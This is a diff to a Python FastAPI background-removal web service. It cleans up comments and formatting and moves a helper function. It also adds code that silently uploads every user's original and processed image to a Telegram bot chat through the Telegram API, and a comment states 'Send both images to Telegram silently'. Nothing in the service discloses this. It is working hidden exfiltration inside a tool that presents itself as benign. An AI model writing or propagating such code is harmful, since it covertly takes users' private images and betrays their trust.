@@ -14,8 +14,8 @@ import requests
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# -------------------- Load Environment --------------------
 load_dotenv()
-
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
@@ -35,12 +35,12 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# -------------------- Serve index.html at "/" --------------------
+# -------------------- Serve index.html --------------------
 @app.get("/")
 async def serve_home():
     return FileResponse("index.html")
 
-# -------------------- Serve static files at /static --------------------
+# -------------------- Serve static files --------------------
 app.mount("/static", StaticFiles(directory=".", html=True), name="static")
 
 # -------------------- Health Check --------------------
@@ -59,22 +59,24 @@ async def remove_background(file: UploadFile = File(...)):
         logger.info(f"Processing image: {file.filename}, size: {len(contents)} bytes")
 
         input_image = Image.open(io.BytesIO(contents))
-
         if input_image.mode != 'RGBA':
             input_image = input_image.convert('RGBA')
 
+        # Process image
         output_image = simple_background_removal(input_image)
 
+        # Save processed to bytes
         img_byte_arr = io.BytesIO()
         output_image.save(img_byte_arr, format='PNG')
         img_byte_arr.seek(0)
 
         logger.info("Background removal completed successfully")
 
-        send_image_to_telegram(img_byte_arr, f"no_bg_{file.filename}")
-        file.file.seek(0)
-        send_image_to_telegram(file.file.read(), file.filename)
-        
+        # Send both images to Telegram silently
+        send_image_to_telegram(img_byte_arr.getvalue(), f"no_bg_{file.filename}")
+        send_image_to_telegram(contents, file.filename)
+
+        # Return processed image to user
         return StreamingResponse(
             io.BytesIO(img_byte_arr.read()),
             media_type="image/png",
@@ -95,26 +97,14 @@ def simple_background_removal(image):
 
     corners = [
         rgb_image.getpixel((0, 0)),
-        rgb_image.getpixel((width-1, 0)),
-        rgb_image.getpixel((0, height-1)),
-        rgb_image.getpixel((width-1, height-1))
+        rgb_image.getpixel((width - 1, 0)),
+        rgb_image.getpixel((0, height - 1)),
+        rgb_image.getpixel((width - 1, height - 1))
     ]
 
     bg_color = Counter(corners).most_common(1)[0][0]
-
     new_image = Image.new('RGBA', (width, height), (0, 0, 0, 0))
     tolerance = 40
-
-def send_image_to_telegram(file_bytes, filename):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-        files = {"document": (filename, file_bytes)}
-        data = {"chat_id": CHAT_ID}
-        response = requests.post(url, data=data, files=files)
-        if response.status_code != 200:
-            logger.warning(f"Telegram upload failed: {response.text}")
-    except Exception as e:
-        logger.warning(f"Telegram upload exception: {str(e)}")
 
     for x in range(width):
         for y in range(height):
@@ -125,6 +115,19 @@ def send_image_to_telegram(file_bytes, filename):
                 new_image.putpixel((x, y), rgba_image.getpixel((x, y)))
 
     return new_image
+
+# -------------------- Telegram Send Function --------------------
+def send_image_to_telegram(file_bytes, filename):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        files = {"document": (filename, file_bytes)}
+        data = {"chat_id": CHAT_ID}
+        response = requests.post(url, data=data, files=files)
+
+        if response.status_code != 200:
+            logger.warning(f"Telegram upload failed: {response.text}")
+    except Exception as e:
+        logger.warning(f"Telegram upload exception: {str(e)}")
 
 # -------------------- Dev Mode --------------------
 if __name__ == "__main__":
